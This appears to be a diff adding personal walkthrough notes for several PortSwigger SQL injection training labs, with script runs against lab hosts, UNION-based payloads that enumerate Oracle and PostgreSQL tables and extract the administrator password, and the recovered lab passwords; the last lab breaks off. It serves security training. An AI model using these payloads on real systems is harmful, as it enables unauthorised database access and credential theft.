@@ -96,4 +96,120 @@
 
 4. The password is: `gihs1spbm0jq86ghgc07`
 
+# Lab: SQL injection attack, listing the database contents on Oracle
 
+1. Determining amount of columns:
+
+    ```
+    ┌──(hue1337㉿kali)-[~/…/GitHub/Portswigger-Academy/SQL_Injection/Scripts]
+    └─$ python3 columns_amount.py --url https://0a6600e9041d095983a6879c00e80017.web-security-academy.net/ --param category --amount 4
+    https://0a6600e9041d095983a6879c00e80017.web-security-academy.net/filter?category=%27%20order%20by%2010--%20-
+    [+] Amount of columns: 2 
+    [+] Oracle DB 
+                    
+    ```
+
+2. Checking the docs `all_tables`
+    ```
+    https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TABLES.html#GUID-6823CD28-0681-468E-950B-966C6F71325D
+    ```
+
+3. Listing tables names:
+
+    ```sql
+    ' union select table_name, null from all_tables-- -
+    ```
+
+4. Listing columns names:
+
+    ```SQL
+    ' union select column_name, null from all_tab_cols where table_name='USERS_OQAAMW'-- -
+    ```
+
+5. Finding the password fot the administrator:
+    ```sql
+    ' union select PASSWORD_LIEFIK, null from USERS_OQAAMW where USERNAME_DQZARO='administrator'-- -
+    ```
+
+6. Logging to administrator acc with the password `o5qpgsrouodfkc3q464b`.
+
+
+# Lab: SQL injection UNION attack, determining the number of columns returned by the query
+
+1. Determine the amount of columns using `null`s:
+    ```sql
+    ' union select null, null, null-- -
+    ```
+
+2. The lab is solved.
+
+# Lab: SQL injection UNION attack, finding a column containing text
+
+1. Determine the amount of columns:
+    ```
+    ┌──(hue1337㉿kali)-[~/…/GitHub/Portswigger-Academy/SQL_Injection/Scripts]
+    └─$ python3 columns_amount.py --url https://0aaf00c00403110e8571e53d003e00e1.web-security-academy.net/ --param category --amount 4
+    [+] Amount of columns: 3 
+    ```
+
+2. Identyfing the column which is compatible the string data type:
+
+    ```sql
+    ' union select null, 'a', null-- -
+    ```
+
+3. Completing the lab:
+
+    ```sql
+    ' union select null, '4P3biH', null-- -
+    ```
+
+# Lab: SQL injection UNION attack, retrieving data from other tables
+
+1. Determing amount of columns and type of database:
+
+    ```
+    ┌──(hue1337㉿kali)-[~/…/GitHub/Portswigger-Academy/SQL_Injection/Scripts]
+    └─$ python3 columns_amount.py --url https://0a1900af04ea6e4d814e4f5d00e20028.web-security-academy.net/ --param category --amount 4
+    https://0a1900af04ea6e4d814e4f5d00e20028.web-security-academy.net/filter?category=%27%20order%20by%2010--%20-
+    [+] Amount of columns: 2
+    [+] Postgre 
+    ```
+
+2. Displaying tables names:
+
+    ```sql
+    ' union select table_name, null from information_schema.tables-- -
+    ```
+
+3. Listing all usernames:
+
+    ```sql
+    ' union select column_name,null from information_schema.columns where table_name='users'-- -
+    ```
+
+    - carlos
+    - wiener
+    - administrator
+
+4. Getting `adminidstrator`'s password:
+
+    ```sql
+    ' union select password, null from users where username='administrator'-- -
+    ```
+
+    - 9nvwvn5hbu5llbycp21h
+
+
+# Lab: SQL injection UNION attack, retrieving multiple values in a single column
+
+1. Determining amount of columns:
+
+    ```
+    ┌──(hue1337㉿kali)-[~/…/GitHub/Portswigger-Academy/SQL_Injection/Scripts]
+    └─$ python3 columns_amount.py --url https://0aee003b046eaaea838591f1008300b3.web-security-academy.net/ --param category --amount 4
+    https://0aee003b046eaaea838591f1008300b3.web-security-academy.net/filter?category=%27%20order%20by%2010--%20-
+    [+] Amount of columns: 2 
+    ```
+
+2. 
